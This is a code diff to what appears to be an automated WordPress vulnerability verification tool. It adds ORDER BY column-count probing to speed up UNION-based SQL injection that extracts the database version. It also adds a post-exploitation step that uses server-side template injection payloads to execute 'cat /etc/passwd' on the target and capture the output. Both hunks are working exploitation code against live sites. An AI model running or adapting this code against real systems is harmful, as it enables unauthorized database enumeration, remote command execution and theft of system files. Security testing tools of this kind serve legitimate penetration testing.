@@ -8271,9 +8271,44 @@ def verify_wordpress_sqli(
              "extraer version() real...")
         union_tried = []
         union_found = None
+
+        # --- Smart column count inference ---
+        # Try ORDER BY N to find the column count before brute-forcing UNION SELECT.
+        # ORDER BY N fails (error/different response) when N > actual column count.
+        # This avoids O(col^2) brute-force when we can probe in O(col) steps.
+        _inferred_col_count = None
+        try:
+            _prev_len = base_resp.content.__len__() if hasattr(base_resp, "content") else len((base_resp.text or "").encode())
+            for _ncols in range(1, 11):
+                _ob_payload = f"{orig_value} ORDER BY {_ncols}-- -"
+                try:
+                    _ob_r = send(_ob_payload)
+                    _ob_len = len((_ob_r.text or "").encode())
+                    # If ORDER BY causes a noticeable error (MySQL returns error or status changes)
+                    # then _ncols-1 is the actual column count
+                    _ob_body = (_ob_r.text or "").lower()
+                    if ("unknown column" in _ob_body or "order clause" in _ob_body
+                            or _ob_r.status_code >= 500
+                            or abs(_ob_len - _prev_len) > 200):
+                        _inferred_col_count = _ncols - 1
+                        step(f"ORDER BY inference: columnas = {_inferred_col_count} (ORDER BY {_ncols} falló)")
+                        break
+                    _prev_len = _ob_len
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+        # Build ordered search: inferred count first, then remaining in both directions
+        if _inferred_col_count and 1 <= _inferred_col_count <= 8:
+            _col_search_order = [_inferred_col_count] + [
+                n for n in range(1, 9) if n != _inferred_col_count]
+        else:
+            _col_search_order = list(range(1, 9))
+
         for ctx in contexts:
             for cm in comments:
-                for n in range(1, 9):
+                for n in _col_search_order:
                     for pos in range(n):
                         cols = ["NULL"] * n
                         cols[pos] = "version()"
@@ -11151,6 +11186,26 @@ def verify_wordpress_ssti(
                                     if _id_m:
                                         res.evidence["ssti_rce_id_output"] = _id_m.group(0)
                                         step(f"SSTI RCE escalado: id={_id_m.group(0)}")
+                                except Exception:
+                                    pass
+                                # Post-RCE Phase 2: file read /etc/passwd
+                                try:
+                                    from .payload_kb import load_ssti_rce_payloads as _lsrp_wp
+                                    _fr_payloads = _lsrp_wp("cat /etc/passwd")
+                                    for _fr_lbl, _fr_pl in _fr_payloads[:5]:
+                                        _fr_params = dict(base_params)
+                                        _fr_params[ssti_param] = _fr_pl
+                                        _fr_resp = boot.sub_sess.request(
+                                            m, boot.base_url + endpoint,
+                                            data=_fr_params if m != "GET" else None,
+                                            params=_fr_params if m == "GET" else None, timeout=15)
+                                        _fr_body = _fr_resp.text or ""
+                                        if re.search(r"root:[x*]:0:0:", _fr_body):
+                                            _fr_lines = [ln for ln in _fr_body.splitlines()
+                                                         if ":" in ln and ln.strip()][:3]
+                                            res.evidence["ssti_etc_passwd"] = _fr_lines
+                                            step(f"SSTI file read /etc/passwd confirmado via {_fr_lbl} ({len(_fr_lines)} lines)")
+                                            break
                                 except Exception:
                                     pass
                                 break
